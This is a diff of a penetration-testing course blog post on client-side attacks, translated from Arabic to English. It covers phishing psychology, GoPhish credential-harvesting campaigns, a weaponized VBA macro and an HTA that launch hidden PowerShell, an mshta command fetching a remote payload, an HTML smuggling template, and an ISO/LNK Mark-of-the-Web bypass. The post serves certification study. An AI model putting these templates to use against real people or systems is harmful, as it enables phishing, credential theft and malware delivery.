@@ -3,7 +3,7 @@ title: "eCPPT Deep-Dive: Part 9 - Client-Side Attacks: Weaponization & Phishing 
 date: 2026-11-12 16:00:00 +0300
 categories: [Cyber Security, Penetration Testing]
 tags: [ecppt, client-side-attacks, social-engineering, gophish, vba-macros, html-smuggling, motw]
-description: "الدليل الشامل للجزء التاسع من مسار eCPPT: سيكولوجيا الهندسة الاجتماعية، نشر خوادم التصيد عبر GoPhish، تطوير ماكرو أوفيس الخبيث، تهريب الشيفرات عبر HTML Smuggling، وتجاوز علامة Mark-of-the-Web."
+description: "An exhaustive technical breakdown of Part 9 of the eCPPT curriculum: social engineering psychology, GoPhish campaign infrastructure, Microsoft Office VBA macro weaponization, HTML Application (HTA) payloads, HTML Smuggling, and Mark-of-the-Web (MOTW) container evasion."
 image:
   path: /assets/images/posts/ecppt/part-9-cover.png
   alt: "eCPPT Masterclass Part 9 - Client-Side Attacks: Weaponization & Phishing Delivery"
@@ -14,56 +14,54 @@ schema:
   author: Abdulrahman M. Fathi
 ---
 
-عندما تكون البنية التحتية الخارجية للشركة محصنة تمامًا بأحدث الجدران النارية وأنظمة منع التسلل، ولا توجد أي خدمات ويب مكشوفة تحتوي على ثغرات، يصبح الطريق الأسهل والأكثر نجاحًا لاختراق المؤسسة هو استهداف **العنصر البشري** والأنظمة الداخلية عبر **الهجمات من جانب العميل (Client-Side Attacks)**.
+When enterprise perimeter firewalls are strictly hardened, zero inbound services are exposed to the public internet, and web applications are rigorously patched, organizations often consider themselves impervious to external compromise. Yet time and again, penetration testers and advanced threat actors breach these environments through the weakest link: **the human user behind the browser or email client**.
 
-في هذا الجزء التاسع من مسار **eCPPT**، سنفكك المنهجية الكاملة لبناء هجمات التصيد الاحتيالي المتقدمة، وتجهيز البنية التحتية عبر **GoPhish**، وتطوير الحمولات الخبيثة (Weaponization) مثل ماكرو مايكروسوفت أوفيس (**VBA Macros**)، وتطبيقات **HTA**، وتقنية **HTML Smuggling** الحديثة لتجاوز بوابات التفتيش الأمني وعلامة **Mark-of-the-Web (MOTW)**.
+In this deep dive covering Part 9 of the **eCPPT (eLearnSecurity Certified Professional Penetration Tester)** curriculum, we break down the operational mechanics of **Client-Side Attacks**. We examine social engineering psychological frameworks, configure enterprise phishing infrastructure using **GoPhish**, develop weaponized **Office VBA Macros**, execute **HTML Application (HTA)** attacks, and bypass perimeter security proxies using **HTML Smuggling** and **Mark-of-the-Web (MOTW)** evasion techniques.
 
 ---
 
-### جدول التنقل في السلسلة (Series Navigation)
+### Series Navigation
 
-| **المقال السابق** | **المقال الحالي** | **المقال القادم** |
+| **Previous Part** | **Current Part** | **Next Part** |
 | :---: | :---: | :---: |
-| [الجزء 8: اختبار اختراق تطبيقات الويب (Web Pentesting)](/posts/ecppt-v3-part-8-web-application-penetration-testing/) | **الجزء 9: الهجمات من جانب العميل (Client-Side Attacks)** | [الجزء 10: باورشيل الهجومي وتجاوز حماية AMSI](/posts/ecppt-v3-part-10-powershell-for-pentesters/) |
+| [Part 8: Web Application Pentesting](/posts/ecppt-v3-part-8-web-application-penetration-testing/) | **Part 9: Client-Side Attacks & Weaponization** | [Part 10: PowerShell for Pentesters & AMSI Evasion](/posts/ecppt-v3-part-10-powershell-for-pentesters/) |
 
 ---
 
-## أبرز النقاط الرئيسية (Key Takeaways)
+## Key Takeaways
 
-* **أفضلية الهجمات من جانب العميل**: تبدأ هذه الهجمات باتصال صادر (Outbound Connection) من داخل شبكة الضحية إلى خادم المهاجم، مما يلتف تمامًا على قواعد الجدران النارية التي تحظر الاتصالات الواردة.
-* **المبادئ السيكولوجية الستة لروبرت سيالديني**: يعتمد الإيقاع بالضحايا على استغلال محفزات بشرية مثبتة علميًا: السلطة (Authority)، الندرة (Scarcity)، الإلحاح (Urgency)، الإثبات الاجتماعي (Social Proof)، والاتساق (Consistency).
-* **تسليح مستندات أوفيس (VBA Macro Weaponization)**: استخدام دوال التشغيل التلقائي `AutoOpen()` و `Document_Open()` واستدعاء واجهات نظام ويندوز (Win32 APIs) لتشغيل قنوات اتصال C2 في الذاكرة مع تعمية الكود عبر أدوات مثل **MacroPack**.
-* **تهريب الشيفرات (HTML Smuggling)**: تقنية حديثة لتوليد الحمولات الخبيثة ديناميكيًا داخل متصفح الضحية باستخدام كائنات JavaScript Blobs، مما يمنع بوابات البريد والجدران النارية من رؤية الملف الحقيقي أثناء عبوره للشبكة.
-* **تجاوز علامة الويب (MOTW Bypass)**: وضع الحمولات داخل ملفات حاوية غير مفعل بها التدفق البديل للبيانات (`Zone.Identifier`) مثل ملفات ISO و VHD و LNK لتجاوز تحذيرات SmartScreen وحظر ماكرو أوفيس الافتراضي.
+* **Inbound vs. Outbound Threat Vectors**: Unlike server-side attacks that require direct inbound connectivity to a listening port, client-side attacks rely on **outbound connections** initiated by trusted internal users, completely bypassing inbound firewall rules.
+* **Cialdini's Psychological Principles**: Successful phishing pretexts leverage proven persuasion triggers: **Authority** (IT security mandates), **Scarcity/Urgency** (mandatory password reset deadlines), **Social Proof** (departmental compliance updates), and **Consistency**.
+* **Phishing Infrastructure Hygiene**: High-deliverability phishing servers deployed via **GoPhish** require rigorous DNS authentication alignment: **SPF** (authorized sender IP ranges), **DKIM** (cryptographic header signing), and **DMARC** policy enforcement to prevent spoofing detection.
+* **VBA Macro Weaponization**: Crafting malicious Microsoft Office documents utilizing `AutoOpen()` and `Document_Open()` subroutines that dynamically invoke Windows API calls or execute obfuscated in-memory payloads using tools such as **MacroPack**.
+* **HTML Smuggling & MOTW Container Bypasses**: Bypassing web proxies and email gateways by constructing malicious binary payloads dynamically in the victim's browser using JavaScript Blobs. Delivering these payloads inside container formats (such as **ISO** and **VHD**) avoids the NTFS `Zone.Identifier` Mark-of-the-Web flag, neutralizing Microsoft SmartScreen warnings.
 
 ---
 
-## 1. دورة حياة هجمات Client-Side (End-to-End Execution Pipeline)
-
-يوضح المخطط المتكامل مسار الهجوم منذ مرحلة الاستطلاع حتى الحصول على موطئ قدم داخل شبكة المؤسسة:
+## 1. End-to-End Client-Side Attack Pipeline
 
 ```mermaid
 flowchart TD
-    subgraph ReconPhase ["المرحلة 1: الاستطلاع وجمع المعلومات"]
-        OSINT["جمع بيانات الموظفين وعناوين البريد<br/>(LinkedIn / Hunter.io / TheHarvester)"]
-        Pretext["بناء الذريعة النفسية المحكمة (Pretexting Scenario)"]
+    subgraph ReconPhase ["Phase 1: Target Intelligence & Pretexting"]
+        OSINT["Employee Reconnaissance & OSINT<br/>(LinkedIn / Hunter.io / theHarvester)"]
+        Pretext["Pretext Construction & Scenario Crafting<br/>(Urgent IT Compliance / Invoice Review)"]
     end
 
-    subgraph InfraPhase ["المرحلة 2: تجهيز البنية التحتية"]
-        GoPhish["نشر خادم GoPhish وإعداد قوالب الرسائل"]
-        DNSConfig["ضبط سجلات البريد الموثوقة: SPF, DKIM, DMARC"]
+    subgraph InfraPhase ["Phase 2: Infrastructure Deployment"]
+        GoPhish["Deploy GoPhish Server & Campaign Templates"]
+        DNSConfig["Configure Clean Email DNS: SPF, DKIM, DMARC"]
     end
 
-    subgraph WeaponPhase ["المرحلة 3: تسليح وتجهيز الحمولات"]
-        Macro["مستند Word / Excel يحتوي على VBA Macro مشفر"]
-        Smuggle["صفحة HTML Smuggling تولد ملف ISO / LNK داخل المتصفح"]
+    subgraph WeaponPhase ["Phase 3: Payload Weaponization"]
+        Macro["VBA Macro Embedded in Word / Excel (.docm)"]
+        Smuggle["HTML Smuggling Page Generating ISO / LNK Container"]
     end
 
-    subgraph DeliveryPhase ["المرحلة 4: التسليم والتنفيذ"]
-        MailDelivery["إرسال البريد المستهدف (Spear-Phishing)"]
-        VictimClick["الموظف يفتح الرابط أو يحمل المرفق"]
-        MOTWBypass["تجاوز تحذيرات الحماية وتشغيل الكود في الذاكرة"]
-        Beacon["اتصال عكسي فوري بخادم C2 (Empire / Sliver)!"]
+    subgraph DeliveryPhase ["Phase 4: Delivery & Execution"]
+        MailDelivery["Spear-Phishing Email Transmission"]
+        VictimClick["Victim Opens Link or Downloads Attachment"]
+        MOTWBypass["Bypass SmartScreen & MOTW via ISO Container"]
+        Beacon["Instant Reverse C2 Connection to Team Server!"]
     end
 
     OSINT --> Pretext --> GoPhish --> DNSConfig --> Macro & Smuggle --> MailDelivery --> VictimClick --> MOTWBypass --> Beacon
@@ -71,61 +69,62 @@ flowchart TD
 
 ---
 
-## 2. سيكولوجيا الهندسة الاجتماعية والاستطلاع (Social Engineering Psychology)
+## 2. Social Engineering Psychology & Target Profiling
 
-تعتمد سيناريوهات التصيد الناجحة على المبادئ النفسية التي وضعها الدكتور روبرت سيالديني:
+Successful social engineering exploits human psychological heuristics identified by Dr. Robert Cialdini:
 
-1. **السلطة (Authority)**: انتحال صفة الإدارة العليا، قسم تقنية المعلومات (IT Support)، أو الجهات الحكومية والتنظيمية.
-2. **الإلحاح والندرة (Urgency & Scarcity)**: صياغة رسائل تدعي وجوب تغيير كلمة المرور خلال 15 دقيقة لتفادي إيقاف الحساب.
-3. **المعاملة بالمثل (Reciprocity)**: تقديم خدمة أو تقرير مجاني يدفع الضحية للتعاون التلقائي.
-4. **الاتساق والمطابقة (Consistency & Social Proof)**: الإشارة إلى أن زملاء آخرين في نفس القسم قاموا بالفعل بتحديث بياناتهم.
+1. **Authority**: Posing as senior executive leadership, corporate legal counsel, or internal IT compliance teams.
+2. **Urgency & Scarcity**: Establishing strict deadlines (e.g., "Account suspended within 15 minutes unless verified").
+3. **Consistency & Social Proof**: Referencing corporate events, department colleagues, or enterprise software migrations (e.g., "Your department's transition to Microsoft 365").
 
-### الاستطلاع الرقمي للموظفين (Target Profiling):
+### Target OSINT and Metadata Profiling:
+
 ```bash
-# استخراج كافة الحسابات والبريد الإلكتروني لنطاق الشركة
+# Enumerate employee email addresses and LinkedIn profiles
 theHarvester -d targetcompany.com -b linkedin,google -l 200
 
-# فحص البيانات الوصفية (Metadata) لملفات PDF التي نشرتها المؤسسة لمعرفة إصدارات البرمجيات وأسماء المستخدمين
-exiftool -Creator -Author -Producer *.pdf
+# Inspect metadata of public corporate documents to identify OS versions and usernames
+exiftool -Creator -Author -Producer -Company *.pdf
 ```
 
 ---
 
-## 3. نشر خوادم التصيد الاحترافية عبر GoPhish
+## 3. Enterprise Phishing Infrastructure: GoPhish Setup
 
-تعد **GoPhish** المنصة القياسية المفتوحة المصدر لإدارة حملات التصيد والمحاكاة الأمنية:
+**GoPhish** is the premier open-source phishing framework used to conduct authorized simulations and spear-phishing campaigns:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor RedTeam as مهندس الاختراق
-    participant GoPhish as خادم GoPhish
-    participant MailServer as خادم البريد (SMTP Relay)
-    actor Victim as الموظف المستهدف
-    participant Landing as صفحة الهبوط المزيفة (Fake Login Page)
+    actor RedTeam as Red Team Operator
+    participant GoPhish as GoPhish Server
+    participant SMTP as Corporate SMTP Relay
+    actor Victim as Targeted Employee
+    participant Landing as Spoofed Portal (SSO Landing Page)
     
-    RedTeam->>GoPhish: تهيئة حملة التصيد: تحديد قائمة البريد، القالب، وصفحة الهبوط
-    GoPhish->>MailServer: إرسال الرسائل عبر خادم SMTP موثوق (SPF / DKIM مطابق)
-    MailServer->>Victim: وصول الرسالة لصندوق الوارد دون الوقوع في مجلد الـ Spam
-    Victim->>Landing: النقر على الرابط المخصص مع كود التتبع الفريد
-    Landing->>GoPhish: تسجيل الحدث: "الموظف فتح الرابط"
-    Victim->>Landing: إدخال اسم المستخدم وكلمة المرور في الصفحة المزيفة
-    Landing->>GoPhish: التقاط الاعتمادات المسروقة وتوجيه الموظف للموقع الحقيقي!
+    RedTeam->>GoPhish: Configure campaign: Sending Profile, Email Template, Landing Page
+    GoPhish->>SMTP: Transmit email with cryptographic DKIM signature and valid SPF
+    SMTP->>Victim: Email lands directly in Inbox (bypassing spam filters)
+    Victim->>Landing: Clicks personalized tracking link in email
+    Landing->>GoPhish: Records "Email Clicked" telemetry event
+    Victim->>Landing: Submits credentials on spoofed authentication portal
+    Landing->>GoPhish: Captures credentials and transparently redirects victim to legitimate portal!
 ```
 
-### متطلبات أمان البريد لتفادي فلاتر Spam:
-* **سجل SPF (Sender Policy Framework)**: تحديد عناوين IP المصرح لها بإرسال البريد نيابة عن النطاق.
-* **توقيع DKIM (DomainKeys Identified Mail)**: توقيع رقمي بمفتاح تشفير خاص في ترويسة الرسالة لإثبات عدم التلاعب بها.
-* **سياسة DMARC**: توجيه خوادم الاستقبال للتحقق من مطابقة SPF و DKIM وتحديد التصرف في حال الفشل (`p=reject`).
+### Essential DNS Authentication Configuration:
+* **SPF (Sender Policy Framework)**: A TXT record defining which server IPs are authorized to send mail for your domain:
+  `v=spf1 ip4:198.51.100.10 ~all`
+* **DKIM (DomainKeys Identified Mail)**: Generates a public/private cryptographic keypair. The private key signs outgoing email headers, and the public key is published via DNS TXT records.
+* **DMARC (Domain-based Message Authentication)**: Directs receiving mail servers how to treat messages that fail SPF/DKIM validation (`p=reject`).
 
 ---
 
-## 4. تسليح مستندات أوفيس عبر ماكرو VBA (Macro Weaponization)
+## 4. Microsoft Office VBA Macro Weaponization
 
-تسمح لغة **Visual Basic for Applications (VBA)** بتنفيذ كود برمجي تلقائيًا بمجرد فتح المستند وتمكين المحتوى عبر إجراءات `AutoOpen()` في Word أو `Workbook_Open()` في Excel.
+Visual Basic for Applications (VBA) allows automatic code execution upon document open via `AutoOpen()` in Word or `Workbook_Open()` in Excel.
 
 ```vba
-' مثال تعليمي لماكرو أوفيس يقوم باستدعاء باورشيل في الذاكرة
+' Example weaponized VBA macro
 Sub AutoOpen()
     ExecutePayload
 End Sub
@@ -138,37 +137,38 @@ Sub ExecutePayload()
     Dim strCommand As String
     Dim objWshShell As Object
     
-    ' تجهيز أمر باورشيل للتحميل في الذاكرة
-    strCommand = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAA...=="
+    ' PowerShell cradle executing obfuscated payload in memory
+    strCommand = "powershell.exe -NoP -NonI -W Hidden -Enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAEMAbABpAGUAbgB0ACkALgBEAG8...=="
     
-    Set objWshShell = CreateObject("Wscript.Shell")
+    Set objWshShell = CreateObject("WScript.Shell")
     objWshShell.Run strCommand, 0, False
 End Sub
 ```
 
-### تعمية الكود وتخطي مكافحات الفيروسات عبر MacroPack:
+### Code Obfuscation via MacroPack:
+
 ```bash
-# استخدام أداة MacroPack لتوليد ماكرو مشفر ومعقد بالكامل
+# Generate highly obfuscated Word document macro bypassing signature detection
 macro_pack.exe --obfuscate -t MSWORD -G document.docm
 ```
 
 ---
 
-## 5. تطبيقات HTML الخبيثة (HTA Attacks)
+## 5. HTML Application (HTA) Attacks
 
-تطبيقات **HTML Applications (.hta)** هي ملفات نصية تحتوي على كود HTML مدمج مع لغة VBScript أو JScript. الميزة القاتلة لملفات HTA أنها تُنفذ خارج القيود الأمنية للمتصفح (Sandbox-Free) عبر محرك نظام ويندوز الرسمي `mshta.exe` بصلاحيات كاملة للمستخدم المحلي!
+**HTML Applications (.hta)** are standalone Windows applications containing HTML, VBScript, and JScript. Because they are executed natively by `mshta.exe`, they execute **outside the browser security sandbox**, possessing full local user permissions!
 
 ```html
-<!-- نموذج لملف payload.hta الخبيث -->
+<!-- Malicious payload.hta -->
 <html>
 <head>
 <script language="VBScript">
     Sub Window_OnLoad
         Dim objShell
         Set objShell = CreateObject("WScript.Shell")
-        ' تشغيل حمولة C2 خفية في الخلفية
+        ' Spawn hidden PowerShell C2 agent in the background
         objShell.Run "powershell.exe -W Hidden -Enc <Base64_Payload>", 0, False
-        ' إغلاق نافذة HTA فورًا لتفادي شكوك المستخدم
+        ' Immediately terminate the HTA window to minimize visibility
         window.close
     End Sub
 </script>
@@ -178,45 +178,43 @@ macro_pack.exe --obfuscate -t MSWORD -G document.docm
 </html>
 ```
 
-يمكن تشغيل هذا الملف عن بعد عبر سطر أوامر ويندوز دون تنزيله يدويًا:
+Executing remotely via Windows command line:
 ```cmd
 mshta.exe http://10.10.14.5/payload.hta
 ```
 
 ---
 
-## 6. تقنية تهريب الشيفرات وتجاوز علامة الويب (HTML Smuggling & MOTW Bypass)
+## 6. HTML Smuggling & Mark-of-the-Web (MOTW) Evasion
 
-تعتبر تقنية **HTML Smuggling** من أحدث تقنيات تسليم الحمولات التي تعتمد عليها كبرى مجموعات التهديد المتقدمة (APTs):
+**HTML Smuggling** constructs malicious payloads entirely client-side using JavaScript Blobs. Security appliances and firewalls only see benign HTML and JavaScript crossing the wire:
 
 ```mermaid
 sequenceDiagram
     autonumber
-    actor Victim as متصفح الضحية (Chrome / Edge)
-    participant WebServer as خادم المهاجم (Smuggling Page)
-    participant Perimeter as الجدار الناري / بوابة البريد
+    actor Victim as Victim Browser (Edge / Chrome)
+    participant WebServer as Attacker Web Server
+    participant Gateway as Secure Email / Web Gateway (Proxy)
     
-    Victim->>WebServer: زيارة صفحة عادية تبدو كصفحة تحميل مستند فواتير
-    WebServer-->>Perimeter: إرسال كود HTML و JavaScript عادي مشفر (تجاوز الفحص تمامًا!)
-    Perimeter-->>Victim: وصول الصفحة إلى المتصفح دون أي إنذار أمني
+    Victim->>WebServer: Visits benign-looking invoice download page
+    WebServer-->>Gateway: Transmits clean HTML and obfuscated JavaScript
+    Gateway-->>Victim: Gateway inspects and permits transmission (no binary seen!)
     
-    Note over Victim: يبدأ كود JavaScript بالعمل داخل المتصفح محليًا:
-    Note over Victim: 1. فك تشفير مصفوفة ثنائية (Base64 Byte Array)<br/>2. تجميع الملف كـ Blob ثنائي في الذاكرة<br/>3. استدعاء window.URL.createObjectURL(blob)<br/>4. تفعيل التحميل التلقائي عبر رابط مخفي (a.click())
-    Victim->>Victim: حفظ ملف ISO أو ZIP على القرص الصلب محليًا!
+    Note over Victim: JavaScript executes dynamically in memory:<br/>1. Decodes base64-encoded byte array<br/>2. Assembles binary data into a JavaScript Blob<br/>3. Generates object URL via window.URL.createObjectURL(blob)<br/>4. Fires automated download trigger (a.click())
+    Victim->>Victim: Saves container file (Invoice.iso) directly to Downloads folder!
 ```
 
-### كود HTML Smuggling المتكامل:
+### Production HTML Smuggling Template:
 
 ```html
 <!DOCTYPE html>
 <html>
 <head>
-    <title>Secure Document Download</title>
+    <title>Secure Document Portal</title>
 </head>
 <body>
-    <h2>جاري فك تشفير وتنزيل المستند الآمن... يرجى الانتظار.</h2>
+    <h3>Decrypting your secure invoice... please wait.</h3>
     <script>
-        // مصفوفة البايتات المشفرة لملف تنفيذي أو حاوية ISO
         function base64ToArrayBuffer(base64) {
             var binary_string = window.atob(base64);
             var len = binary_string.length;
@@ -227,10 +225,10 @@ sequenceDiagram
             return bytes.buffer;
         }
 
-        var filePayload = "UEsDBBQAAAAIAAA...[Base64 Payload]...";
-        var data = base64ToArrayBuffer(filePayload);
+        var payload = "UEsDBBQAAAAIAAA...[Base64 Encoded ISO Container]...";
+        var data = base64ToArrayBuffer(payload);
         var blob = new Blob([data], {type: 'application/octet-stream'});
-        var fileName = 'Invoice_November_2026.iso';
+        var fileName = 'Corporate_Invoice_2026.iso';
 
         var a = document.createElement('a');
         document.body.appendChild(a);
@@ -245,18 +243,18 @@ sequenceDiagram
 </html>
 ```
 
-### سر استخدام ملفات الحاويات (ISO / VHD) لتجاوز MOTW:
-عندما يقوم المتصفح بتنزيل ملف من الإنترنت، يضيف نظام ملفات NTFS علامة تعرف بـ **Mark-of-the-Web** في تدفق بديل للبيانات (`Zone.Identifier=3`). هذه العلامة هي التي تجعل ويندوز يحظر تشغيل ماكرو أوفيس ويعرض تحذيرات SmartScreen الصفراء.
+### Bypassing Mark-of-the-Web (MOTW) via ISO Containers:
+When Windows downloads a file via the browser, it tags it with an NTFS Alternate Data Stream: `Zone.Identifier=3` (Internet Zone). This flag triggers SmartScreen warnings and blocks Office macros.
 
-ولكن عند تنزيل ملف **`.iso`** أو **`.vhd`**، فإن نظام ويندوز يسمح بالنقر المزدوج لتركيب القرص الافتراضي (Mount). وتفقد الملفات الموجودة داخل الحاوية علامة MOTW تلقائيًا! بداخل الـ ISO، نضع اختصار **`.lnk`** خبيث يحاكي شكل ملف PDF أو مستند نصي، ولكنه ينفذ أمر باورشيل في الخلفية.
+However, when files are encapsulated inside an **ISO** or **VHD** container, Windows mounts the container as a local virtual disk upon double-click. **The files inside the mounted image do not inherit the MOTW zone flag!** Inside the ISO, we place a disguised Windows Shortcut (`.lnk`) that executes PowerShell in the background.
 
 ---
 
-## المراجع والمصادر الخارجية (References & Further Reading)
+## References & Further Reading
 
 1. **GoPhish Official Framework Documentation**: [https://getgophish.com/documentation/](https://getgophish.com/documentation/)
-2. **MacroPack by Sevagas**: أداة هندسة ماكرو أوفيس وتعمية المستندات: [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
-3. **Outflank - HTML Smuggling Deep-Dive**: أبحاث متقدمة في تقنيات تهريب الملفات عبر المتصفح.
+2. **MacroPack by Sevagas**: [https://github.com/sevagas/macro_pack](https://github.com/sevagas/macro_pack)
+3. **Outflank - HTML Smuggling Techniques & Evasion Research**.
 4. **Robert Cialdini's "Influence: The Psychology of Persuasion"**.
 5. **MITRE ATT&CK Matrix**:
    * Technique T1566: Phishing (Spearphishing Attachment, Spearphishing Link)
